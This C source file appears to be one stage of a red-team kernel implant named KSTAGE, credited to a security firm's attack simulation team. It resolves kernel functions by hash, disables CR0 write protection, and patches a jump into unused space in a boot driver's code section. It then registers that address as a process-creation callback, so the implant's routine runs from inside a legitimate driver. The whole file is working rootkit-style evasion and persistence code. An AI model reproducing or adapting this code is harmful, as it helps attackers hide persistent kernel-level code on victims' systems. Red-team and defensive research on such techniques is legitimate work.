/*!
 *
 * KSTAGE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

#define H_API_PSSETCREATEPROCESSNOTIFYROUTINE	0x7923f7e6 /* PsSetCreateProcessNotifyRoutine */
#define H_API_KESETSYSTEMAFFINITYTHREAD		0x80679c78 /* KeSetSystemAffinityThread */
#define H_STR_TEXT				0x0b6ea858 /* .text */

/*!
 *
 * Purpose:
 *
 * Creates a callback pointing to a module load
 * routine.
 *
!*/

D_SEC( A ) VOID NTAPI Start( _In_ PVOID KernelBase, _In_ PVOID BootDriver )
{
	ULONG			Len = 0;

	PVOID			Ptr = NULL;
	PTABLE			Tbl = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_SECTION_HEADER	Sec = NULL;

	Tbl = C_PTR( G_PTR( Table ) );
	Tbl->KernelBase = C_PTR( KernelBase );

	/* Header pointers */
	Dos = C_PTR( BootDriver );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Sec = IMAGE_FIRST_SECTION( Nth );

	/* Enumerate section pointers */
	for ( INT Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
		/* Is the .text section? */
		if ( HashString( & Sec[ Idx ].Name, 0 ) == H_STR_TEXT ) {
			Len = ( ( Sec[ Idx ].SizeOfRawData + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );

			/* Do we have enough space for the jump target? */
			if ( ( Len - Sec[ Idx ].SizeOfRawData ) >= 14 ) {
				/* Get pointer where we insert our jump */
				Ptr = C_PTR( U_PTR( Dos ) + Sec[ Idx ].SizeOfRawData + Sec[ Idx ].VirtualAddress );

				/* Force __writecr0() to be run on the same CPU */
				( ( __typeof__( KeSetSystemAffinityThread ) * ) PeGetFuncEat( KernelBase, H_API_KESETSYSTEMAFFINITYTHREAD ) )( 0x00000001 );

				/* Remove write protection */
				__writecr0( __readcr0() &~ 0x000010000 );

				/* Insert a jump to our routine */
				*( PUINT16 )( C_PTR( U_PTR( Ptr ) + 0x00 ) ) = ( UINT16 )( 0x25ff );
				*( PUINT32 )( C_PTR( U_PTR( Ptr ) + 0x02 ) ) = ( UINT32 )( 0 );
				*( PUINT64 )( C_PTR( U_PTR( Ptr ) + 0x06 ) ) = ( UINT64 )( G_PTR( ProcessNotifyRoutine ) );

				/* Insert write protection */
				__writecr0( __readcr0() |  0x000010000 );

				/* Create a callback registration */
				( ( __typeof__( PsSetCreateProcessNotifyRoutine ) * ) PeGetFuncEat( KernelBase, H_API_PSSETCREATEPROCESSNOTIFYROUTINE ) )( C_PTR( Ptr ), FALSE );
			};
		};
	};
};
